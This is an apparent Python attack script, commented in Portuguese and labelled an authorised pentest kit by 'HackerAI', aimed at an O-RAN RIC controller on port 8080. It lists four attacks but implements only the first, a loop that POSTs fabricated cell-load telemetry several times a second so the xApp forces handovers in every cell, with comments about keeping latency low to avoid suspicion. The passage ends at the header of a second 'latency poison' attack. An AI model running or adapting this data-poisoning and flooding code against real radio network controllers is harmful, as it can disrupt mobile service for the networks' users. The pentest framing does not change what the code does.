#!/usr/bin/env python3
"""
atacar_oran.py - Kit de Ataque para O-RAN xApp e rApp
Autor: HackerAI / Pentest Autorizado
Alvo: RIC Mestre (ric_mestre.py) nas portas 8080

ATACA:
    1. xApp - Overload Fabricate: envenena dados de telemetria E2
    2. xApp - Latency Poison: workers comprometidos reportam latencia alta
    3. rApp - Energy Policy Injection: força politica A1 alternando rapido
    4. rApp - Resource Drain: faz RIC reduzir capacity para 50%
"""

import threading
import urllib.request
import json
import time
import random
import socket
import sys

# ===== CONFIG =====
RIC_HOST = sys.argv[1] if len(sys.argv) > 1 else "ric-service"
RIC_PORT = sys.argv[2] if len(sys.argv) > 2 else "8080"
BASE_URL = f"http://{RIC_HOST}:{RIC_PORT}"

print("=" * 60)
print("  ORAN ATTACK KIT - Atacando xApp e rApp")
print(f"  Alvo: {BASE_URL}")
print("=" * 60)

# ============================================================
# ATAQUE 1: OVERLOAD FABRICATE (contra o xApp)
# ============================================================
# O xApp le os dados GET do RIC e decide HANDOVER se load > capacity
# Nosso ataque: poe load sempre >200 para forçar HANDOVER em toda celula
def attack_xapp_overload_fabricate():
    """Envenena a resposta GET que o xApp consome"""
    print("[+] Ataque 1 iniciado: OVERLOAD FABRICANTE (xApp)")

    while True:
        try:
            # Simula uma requisicao de telemetria falsa
            # O xApp faz GET em /, entao a gente nao mexe nisso direto
            # Mas podemos enviar POST com dados falsos que o xApp vai ler

            # Injeta metricas falsas de worker comprometido
            fake_metrics = {
                "id": f"worker-comprometido-{random.randint(100,999)}",
                "latency_ms": round(random.uniform(1, 5), 2),  # Latencia baixa pra nao levantar suspeita
                "type": "benchmark",
                "cell_load_mbps": random.randint(220, 280),  # <-- Load FALSO >200!
                "cell_capacity_mbps": 100,
                "connected_users": random.randint(8, 18),  # Poucos usuarios (inconsistente)
                "status": "overload"
            }

            data_bytes = json.dumps(fake_metrics).encode('utf-8')
            req = urllib.request.Request(BASE_URL, data=data_bytes, method="POST")
            req.add_header('Content-Type', 'application/json')
            with urllib.request.urlopen(req, timeout=2) as r:
                pass

            time.sleep(0.3) # 3x por segundo

        except Exception as e:
            print(f"[xApp-Overload] Erro: {e}")
            time.sleep(1)

# ============================================================
# ATAQUE 2: LATENCY POISON (contra o xApp via workers)
# ============================================================
# O xApp le as latencias reportadas pelos workers
# Ataque: worker 0 reporta latencia altissima (>1000ms)